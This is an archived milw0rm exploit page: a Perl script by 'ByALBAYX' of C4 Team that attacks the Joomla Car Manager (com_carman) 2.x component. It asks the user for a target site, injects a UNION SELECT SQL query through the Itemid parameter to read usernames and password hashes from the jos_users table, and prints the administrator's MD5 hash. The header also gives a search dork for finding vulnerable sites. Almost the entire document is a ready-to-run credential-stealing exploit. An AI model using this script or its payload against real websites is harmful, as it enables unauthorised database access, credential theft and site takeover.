<html><head><title>Joomla com_carman 2.x (Itemid) Remote SQL Injection Exploit (1778)</title></head><pre>#!/usr/bin/perl -w
 


###############################################
#[~] Author         :ByALBAYX                 #
#                                             #
#[~] Web Site       :WWW.C4TEAM.ORG           #
#                                             #
#[~] Component_Name :Car Manager 2.x          #
#                                             #
#[~] Script_Name    :Joomla                   #
#                                             #
#[~] Dork           :Com_carman   vs.. vs..   #
#                                             # 
#[~] S.Site         :http://webformatique.com #     
#                                             #     
###############################################

 
 
system(&quot;color f&quot;);
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;
print &quot;\t\t|||                        C4 TEAM                         |||\n\n&quot;;
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;
print &quot;\t\t|||          Car Manager 2.x  Remote SQL Inj Vuln          |||\n\n&quot;;
print &quot;\t\t|||       BYALBAYX     WWWW.C4TEAM.ORG     BYALBAYX        |||\n\n&quot;;
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;
 
use LWP::UserAgent;
 
print &quot;\n[http://wwww.site.com/path/]: &quot;;
 chomp(my $target=&lt;STDIN&gt;);
 
$column_name=&quot;concat(username,0x3a,password)&quot;;
$table_name=&quot;jos_users&quot;;
 
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target .   &quot;/index.php?option=com_carman&amp;task=listall&amp;lang=en&amp;Itemid=1+union+select+1,&quot;.$column_name.&quot;+from/**/&quot;.$table_name.&quot;--&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));$answer = $res-&gt;content; if ($answer =~/([0-9a-fA-F]{32})/){
  print &quot;\n[+] Admin Hash : $1\n\n&quot;;
  print &quot;#   Tebrikler Exploit Calisti!  #\n\n&quot;;
}
else{print &quot;\n[-] Exploit Calismadi...\n&quot;;
}

# milw0rm.com [2009-03-04]</pre></html>